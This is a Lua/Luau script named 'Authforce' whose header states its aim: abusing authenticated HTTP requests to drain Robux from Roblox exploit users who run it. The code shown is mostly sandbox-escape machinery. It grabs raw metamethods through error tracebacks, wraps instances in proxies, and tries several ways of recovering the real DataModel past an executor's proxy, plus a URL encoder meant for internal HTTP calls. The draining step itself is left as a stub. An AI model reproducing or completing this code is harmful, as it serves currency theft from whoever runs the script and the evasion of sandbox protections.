--[[

	Authforce   -   Abusing authenticated HTTP requests to drain Robux from Roblox Exploiters
	Author      -   core | GitHub: @corescripts | Discord: @corescript
	Version     -   1.0

]]

-- Checking if GrabMetamethod actually returns the metamethod or if it's fetching the error() function from Instance proxies.
-- Only checking __index is enough already, right? Surely __newindex and other metamethods won't be spoofed?
xpcall(function()
	GrabMetamethod(game, "__index")("this should not be included")
end, function(Reason)
	if Reason:find("this should not be included") then -- My god I hate badly implemented Instance proxies
		GrabMetamethod = function(Object: any, Metamethod: "__index" | "__tostring" | "__namecall" | "__newindex" | "__metatable" | "__type"): any
			if Metamethod == "__index" then
				return function(self, Index)
					return self[Index]
				end
			elseif Metamethod == "__newindex" then
				return function(self, Index, New)
					self[Index] = New
				end
			elseif Metamethod == "__namecall" then

			elseif Metamethod == "__metatable" then
				return getmetatable(Object)
			elseif Metamethod == "__type" then
				return typeof(Object)
			elseif Metamethod == "__tostring" then
				return function(...)
					return tostring(Object)
				end
			end
		end

		local _game = game -- DataModel proxy cache

		GetActualType = function(Object: any): string | nil
			if Object == _game then
				return "NOT THE ORIGINAL DATAMODEL GOD DAMN IT"
			end

			return typeof(Object)
		end
	end
end)

-- Authforce initialization
return function(Environment: {})
	local Environment: {} = Environment -- Environment of the current thread.
	local Proxies: {} = {} -- A dictionary containing the original instances of a proxy.
	local Exposed: {} = {} -- A dictionary with things that needs to be exposed.

	-- Localize functions used in Authforce from the Environment
	local typeof = Environment.typeof
	local type = Environment.type
	local warn = Environment.warn
	local print = Environment.print
	local pcall = Environment.pcall
	local assert = Environment.assert
	local xpcall = Environment.xpcall
	local getfenv = Environment.getfenv
	local setfenv = Environment.setfenv
	local tostring = Environment.tostring
	local select = Environment.select
	local getmetatable = Environment.getmetatable
	local newproxy = Environment.newproxy
	local unpack = Environment.unpack
	local pairs = Environment.pairs
	local rawset = Environment.rawset
	local rawget = Environment.rawget
	local shared = Environment.shared or {} -- Who knows if it gets invalidated out of the environment?
	local clone = Environment.table.clone
	local table = clone(Environment.table)
	local math = clone(Environment.math)
	local Instance = clone(Environment.Instance)
	local utf8 = clone(Environment.utf8)
	local string = clone(Environment.string)
	local debug = clone(Environment.debug)
	local Color3 = clone(Environment.Color3)
	local os = clone(Environment.os)
	local game = Environment.game

	-- Make sure that we only use the localized functions
	setfenv(1, {})

	-- Just a quick check to see if the Environment passed is legit
	assert(game, "Please run this script inside Roblox.")

	-- Garbage can
	local Void = function(...): ()
		return nil
	end

	-- Returns random UTF8 characters.
	local GenerateGibberish = function(Length: number?): string
		local Gibberish = {}

		if Length == nil then
			Length = 1000
		end

		for _ = 1, Length do
			local CodePoint = math.random(32, 0x10FFFF) -- Excluding control characters.

			if math.random(0, 10) >= 5 then -- A chance of shoving a random NULL character into the gibberish.
				table.insert(Gibberish, "\000")
			end 

			if CodePoint >= 0xD800 and CodePoint <= 0xDFFF then
				CodePoint = CodePoint + 0x800 -- Skipping surrogate pair range.
			end

			table.insert(Gibberish, utf8.char(CodePoint))
		end

		return table.concat(Gibberish)
	end

	-- Returns a secured string that can be passed onto the arguments of C functions. If you are passing it to a Roblox C MT function, consider passing true as the second argument.
	local SecureString = function(String: string, ForIndexingFunctions: boolean?, Length: number?): string
		if ForIndexingFunctions then
			String = String:sub(1, 1):lower() .. String:sub(2) -- It is usually safe to pass camelCase strings to Roblox's C MT functions when indexing into functions due to them being named camelCase internally.
		end

		return String .. "\000\000\000" .. GenerateGibberish(Length)
	end

	-- Returns the URL but reverse-percent-encoded. This is for passing URL arguments to HttpService::requestInternal() function later on. 
	local PercentEncodeUrl = function(Url: string): string
		local CharToHex = function(Char: string)
			return string.format("%%%02X", string.byte(Char))
		end

		Url = Url:gsub("https://", "")
		Url = Url:gsub("http://", "")
		Url = Url:gsub("\n", "\r\n")
		Url = Url:gsub("([A-Za-z])", CharToHex)  
		Url = Url:gsub(" ", "+")

		return "https://" .. Url
	end

	-- Grabs the traceback functions in the error of the first function passed.
	local GrabTracebackFunction = function(ErrorFunction: () -> nil, Level: number): () -> any
		return select(2, xpcall(ErrorFunction, function()
			return debug.info(Level, "f")
		end))
	end

	-- Returns the metamethod of an object by abusing error tracebacks in xpcall. Made to get the C MT functions of an Instance.
	local GrabMetamethod = function(Object: any, Metamethod: "__index" | "__tostring" | "__namecall" | "__newindex" | "__metatable" | "__type"): any
		if Metamethod == "__index" then
			return GrabTracebackFunction(function()
				Void(Object[SecureString("")]) -- Not returning the object to avoid a Luau error due to potential issues if the metamethod was hooked to spoof the output.
			end, 2)
		elseif Metamethod == "__newindex" then
			return GrabTracebackFunction(function()
				Object[SecureString("")] = SecureString("")
			end, 2)
		elseif Metamethod == "__namecall" then
			return GrabTracebackFunction(function()
				Object:_()
			end, 2)
		elseif Metamethod == "__metatable" then
			return getmetatable(Object)
		elseif Metamethod == "__type" then
			return typeof(Object)
		elseif Metamethod == "__tostring" then
			return function(...)
				return tostring(Object)
			end
		end
	end

	-- An alternative to the typeof function
	local __index = GrabMetamethod(game, "__index") -- For optimization purposes. Using a cache for this has literally optimized 5000 GetActualType calls from taking 6.653127200028393 seconds to 0.0017939000390470028 second. Holy.
	local GetActualType = function(Object: any): string | nil
		local Status, Response = pcall(function()
			return __index(Object, "Name")
		end)

		if Status then
			return "Instance"
		else
			local Error = Response:match("Instance expected, got ([^%)]+)")

			if Error == nil then
				return "Instance"
			end

			return Error
		end
	end

	-- Extracts the method in a __namecall metamethod
	-- For some reason, namecall method does not get extracted if the function is localized, so we expose it by shoving it into the table.
	Exposed.OriginalColor3 = Color3.new(1, 1, 1)
	Exposed.Color3Namecall = GrabMetamethod(Exposed.OriginalColor3, "__namecall")
	Exposed.ExtractNamecallMethod = function(...)
		local _, Method = pcall(function(...)
			return Exposed.Color3Namecall(Exposed.OriginalColor3, ...)
		end, ...)

		Method = Method:match("^(.-) is not a valid member")
		return Method
	end

	-- Create a proxy that acts like the object passed, useful if you don't want to deal with the pain that comes with calling the raw metamethods of the object.
	local CreateObjectProxy = function(Object: any): userdata
		local Proxy = newproxy(true)
		local Metatable = getmetatable(Proxy)

		Proxies[Proxy] = Object

		Metatable["__index"] = function(_, Index)
			local __index = GrabMetamethod(Object, "__index")
			local IndexProperties
			local Indexed

			if GetActualType(Index) == "string" then
				Index = SecureString(Index)
				IndexProperties = SecureString(Index, true)
			end

			local Status, Attempt = pcall(function()
				return __index(Object, Index)
			end)

			if Status then
				Indexed = Attempt
			else
				Indexed = __index(Object, IndexProperties)
			end

			if GetActualType(Indexed) == "Instance" then
				Indexed = Exposed.CreateObjectProxy(Indexed)
			end

			return Indexed
		end

		Metatable["__newindex"] = function(_, Index, New)
			local __newindex = GrabMetamethod(Object, "__newindex")

			if GetActualType(Index) == "string" then
				Index = SecureString(Index)
			elseif GetActualType(Index) == "userdata" then
				Index = Proxies[Index]
			end

			if GetActualType(New) == "string" then
				New = SecureString(New)
			elseif GetActualType(New) == "userdata" then
				New = Proxies[New]
			end

			return __newindex(Object, Index, New)
		end

		Metatable["__namecall"] = function(_, ...) -- We will not invoke the actual __namecall metamethod.
			local __index = GrabMetamethod(Object, "__index")
			local Args = {...}
			local Method = Exposed.ExtractNamecallMethod()

			for Iteration, Value in pairs(Args) do
				if GetActualType(Value) == "string" then
					Args[Iteration] = SecureString(Value)
				elseif GetActualType(Value) == "userdata" then
					Args[Iteration] = Proxies[Value]
				end
			end

			local Namecalled = __index(Object, SecureString(Method, true))(Object, unpack(Args))

			if GetActualType(Namecalled) == "Instance" then
				Namecalled = Exposed.CreateObjectProxy(Namecalled)
			end

			return Namecalled
		end

		Metatable["__tostring"] = GrabMetamethod(Object, "__tostring")
		Metatable["__metatable"] = GrabMetamethod(Object, "__metatable")
		Metatable["__type"] = GrabMetamethod(Object, "__type")

		return Proxy
	end

	-- Exposing the CreateObjectProxy function so that it can be called from inside it.
	Exposed["CreateObjectProxy"] = CreateObjectProxy

	-- The function below will start Authforce!
	return function(...)
		-- Before we do anything else, lets first check if the DataModel is faked.
		if GetActualType(game) ~= "Instance" and GetActualType(game) ~= nil and GetActualType(game) ~= "nil" then
			-- Well... What do we have here! Looks like an Instance proxy. Hopefully getfenv is not hooked so that we can perhaps try escaping.
			local DataModel -- If we ever find an escape, we'll put the original game here.

			-- Checks if a function leaks the original game.
			local CheckForDataModel = function(Function: () -> any | number | {}): boolean
				local Fenv

				if GetActualType(Function) == "table" then
					Fenv = Function
				else
					Fenv = getfenv(Function)
				end

				if GetActualType(Fenv["game"]) == "Instance" then
					DataModel = Fenv["game"]

					return true
				end

				if GetActualType(Fenv["Game"]) == "Instance" then
					DataModel = Fenv["Game"]

					return true
				end

				if rawget(Fenv, "Game") then
					rawset(Fenv, "Game", nil) -- Invalidating the game object from the table that getfenv returns will force index attempts to invoke the __index metamethod which will be equivalent to the raw Roblox environment, exposing the original DataModel.

					if GetActualType(Fenv["Game"]) == "Instance" then
						DataModel = Fenv["Game"]

						return true
					end
				end

				if rawget(Fenv, "game") then
					rawset(Fenv, "game", nil) -- Invalidating the game object from the table that getfenv returns will force index attempts to invoke the __index metamethod which will be equivalent to the raw Roblox environment, exposing the original DataModel.

					if GetActualType(Fenv["game"]) == "Instance" then
						DataModel = Fenv["game"]

						return true
					end
				end

				-- It would be funny if they spoofed getfenv but included a __newindex metamethod that would set the newindex into the internal table
				if Fenv["game"] then
					Fenv["game"] = nil

					if GetActualType(Fenv["game"]) == "Instance" then
						DataModel = Fenv["game"]

						return true
					end
				end

				if Fenv["Game"] then
					Fenv["Game"] = nil

					if GetActualType(Fenv["Game"]) == "Instance" then
						DataModel = Fenv["Game"]

						return true
					end
				end

				return false
			end

			-- Trying things that might leak the original DataModel
			CheckForDataModel(Instance.new)
			CheckForDataModel(game:GetPropertyChangedSignal("Name").Once)
			CheckForDataModel(game.GetPropertyChangedSignal)

			-- Would anything in shared leak the original DataModel?
			if not DataModel then
				if not CheckForDataModel(shared) then
					for _, Value in pairs(shared) do
						if GetActualType(Value) == "function" then
							if CheckForDataModel(Value) then
								break
							end
						elseif GetActualType(Value) == "table" then
							for _, Function in pairs(Value) do
								if GetActualType(Function) == "function" then
									if CheckForDataModel(Function) then
										break
									end
								end
							end
						end
					end
				end
			end

			-- Trying different levels in getfenv and attempting to see if any of their own functions leak the original DataModel.
			if not DataModel then
				for i = 1, 199998 do
					local Status, Fenv = pcall(function()
						return getfenv(i)
					end)

					if not Status then
						break
					else
						for _, Function in pairs(Fenv) do
							if GetActualType(Function) == "function" then
								if CheckForDataModel(Function) then
									break
								end
							end
						end
					end
				end
			end

			-- Attempting to get the original DataModel by forcing errors in functions declared within their init script, such as their metamethods.
			if not DataModel then
				for i = 1, 199998 do
					local Traceback = GrabTracebackFunction(function()
						return game[SecureString("")]
					end, i)

					if Traceback == nil then
						break
					end

					if CheckForDataModel(Traceback) then
						break
					end
				end
			end

			-- Part 2
			if not DataModel then
				for i = 1, 199998 do
					local Traceback = GrabTracebackFunction(function()
						return game[SecureString("HttpGet")]()
					end, i)

					if Traceback == nil then
						break
					end

					if CheckForDataModel(Traceback) then
						break
					end
				end
			end

			if not DataModel then

			end

			-- Why would an executor that supports getgc still use an Instance proxy?
			if not DataModel then
				if Environment.getgc then
					local GC = Environment.getgc()

					if GetActualType(GC) == "table" then
						for _, Function in pairs(GC) do
							if GetActualType(Function) == "function" then
								if CheckForDataModel(Function) then
									break
								end
							end
						end
					end
				end
			end

			-- Successful DataModel proxy bypassing.
			if DataModel then
				warn("DEBUG: SUCCESS")
				rawset(Environment, "game", DataModel)
			end
		end

		-- TODO: IMPLEMENT DATAMODEL SANDBOXING PROTECTION
		-- TODO: IMPLEMENT DATAMODEL SANDBOXING PROTECTION
		-- TODO: IMPLEMENT DATAMODEL SANDBOXING PROTECTION

		do -- Part 1: For external executors that are written in Lua.
			--local game = CreateObjectProxy(Environment.game) -- Proxify our access to DataModel

			--local InsertService = game:GetService("InsertService")

			--warn(InsertService:LoadLocalAsset("rbxassetid://101413896356133"))
			warn("hey there")
		end
	end
end
